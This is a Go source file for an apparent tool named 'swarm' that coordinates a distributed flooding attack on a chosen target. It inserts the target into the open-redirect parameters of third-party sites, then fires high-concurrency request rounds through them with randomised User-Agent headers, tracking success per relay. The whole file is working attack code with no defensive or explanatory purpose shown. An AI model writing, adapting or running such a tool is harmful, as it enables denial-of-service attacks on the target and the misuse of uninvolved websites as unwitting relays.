// Package swarm implements distributed attacks using open redirects.
package swarm

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"sync"
	"sync/atomic"
	"time"

	"vivarium/internal/common"
)

// AttackOpts contains options for a swarm attack.
type AttackOpts struct {
	Rounds      int           // Number of requests per worker
	Concurrency int           // Number of concurrent goroutines
	Delay       time.Duration // Delay between requests
	Verbose     bool          // Enable verbose output
}

// Result contains the results of a swarm attack.
type Result struct {
	TotalRequests int                     // Total requests attempted
	Successful    int                     // Successful requests
	Failed        int                     // Failed requests
	Duration      time.Duration           // Total attack duration
	WorkersUsed   int                     // Number of workers used
	WorkerStats   map[string]*WorkerStats // Per-worker statistics
}

// WorkerStats contains stats for a single worker.
type WorkerStats struct {
	URL        string
	Successful int
	Failed     int
}

// Coordinator manages distributed attacks through workers.
type Coordinator struct {
	client  *http.Client
	workers []string
}

// NewCoordinator creates a new swarm coordinator.
func NewCoordinator(workers []string) *Coordinator {
	return &Coordinator{
		client:  common.FastHTTPClient(),
		workers: workers,
	}
}

// Attack executes a distributed attack through the open redirect workers.
func (c *Coordinator) Attack(ctx context.Context, target string, opts AttackOpts) (*Result, error) {
	if len(c.workers) == 0 {
		return nil, fmt.Errorf("no workers available")
	}

	if opts.Concurrency <= 0 {
		opts.Concurrency = 100
	}
	if opts.Rounds <= 0 {
		opts.Rounds = 100
	}

	var (
		successful atomic.Int64
		failed     atomic.Int64
		completed  atomic.Int64
	)

	// Track per-worker stats
	workerStats := make(map[string]*WorkerStats)
	var statsMu sync.Mutex
	for _, w := range c.workers {
		workerStats[w] = &WorkerStats{URL: w}
	}

	// Build redirect URLs for all workers
	redirectURLs := make([]string, 0, len(c.workers))
	for _, worker := range c.workers {
		redirectURL, err := buildRedirectURL(worker, target)
		if err != nil {
			if opts.Verbose {
				fmt.Printf("   ⚠️  Skipping invalid worker: %s (%v)\n", worker, err)
			}
			continue
		}
		redirectURLs = append(redirectURLs, redirectURL)
	}

	if len(redirectURLs) == 0 {
		return nil, fmt.Errorf("no valid redirect URLs could be built")
	}

	totalRequests := opts.Rounds * len(redirectURLs)
	fmt.Printf("   Using %d workers, %d rounds = %d total requests\n\n",
		len(redirectURLs), opts.Rounds, totalRequests)

	start := time.Now()

	// Create job channel - each job is (round, workerIndex)
	type job struct {
		round       int
		workerIndex int
		workerURL   string
		redirectURL string
	}
	jobs := make(chan job, totalRequests)
	var wg sync.WaitGroup

	// Start workers
	for i := 0; i < opts.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case j, ok := <-jobs:
					if !ok {
						return
					}

					if c.sendRequest(ctx, j.redirectURL) {
						successful.Add(1)
						statsMu.Lock()
						workerStats[j.workerURL].Successful++
						statsMu.Unlock()
					} else {
						failed.Add(1)
						statsMu.Lock()
						workerStats[j.workerURL].Failed++
						statsMu.Unlock()
					}

					current := completed.Add(1)
					if opts.Verbose && current%100 == 0 {
						elapsed := time.Since(start)
						rps := float64(current) / elapsed.Seconds()
						fmt.Printf("\r   Progress: %d/%d (%.1f req/s) | ✓ %d | ✗ %d",
							current, totalRequests, rps, successful.Load(), failed.Load())
					}

					if opts.Delay > 0 {
						time.Sleep(opts.Delay)
					}
				}
			}
		}()
	}

	// Send jobs
	for round := 0; round < opts.Rounds; round++ {
		for i, redirectURL := range redirectURLs {
			select {
			case <-ctx.Done():
				break
			case jobs <- job{
				round:       round,
				workerIndex: i,
				workerURL:   c.workers[i],
				redirectURL: redirectURL,
			}:
			}
		}
	}
	close(jobs)

	wg.Wait()

	if opts.Verbose {
		fmt.Println()
	}

	return &Result{
		TotalRequests: int(completed.Load()),
		Successful:    int(successful.Load()),
		Failed:        int(failed.Load()),
		Duration:      time.Since(start),
		WorkersUsed:   len(redirectURLs),
		WorkerStats:   workerStats,
	}, nil
}

// sendRequest sends a single request through the redirect URL.
func (c *Coordinator) sendRequest(ctx context.Context, redirectURL string) bool {
	req, err := http.NewRequestWithContext(ctx, "GET", redirectURL, nil)
	if err != nil {
		return false
	}

	req.Header.Set("User-Agent", common.RandomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

	resp, err := c.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// Any response (even redirect) means the request went through
	return true
}

// buildRedirectURL constructs a URL that triggers an open redirect to the target.
func buildRedirectURL(workerURL, target string) (string, error) {
	parsed, err := url.Parse(workerURL)
	if err != nil {
		return "", err
	}

	q := parsed.Query()

	// Common redirect parameter names
	redirectParams := []string{"url", "redirect", "redir", "next", "dest", "destination", "return", "returnUrl", "goto", "link", "target", "to"}

	// Try to find an existing redirect parameter
	foundParam := ""
	for _, param := range redirectParams {
		if q.Has(param) {
			foundParam = param
			break
		}
	}

	if foundParam != "" {
		q.Set(foundParam, target)
	} else {
		q.Set("url", target)
	}

	parsed.RawQuery = q.Encode()
	return parsed.String(), nil
}
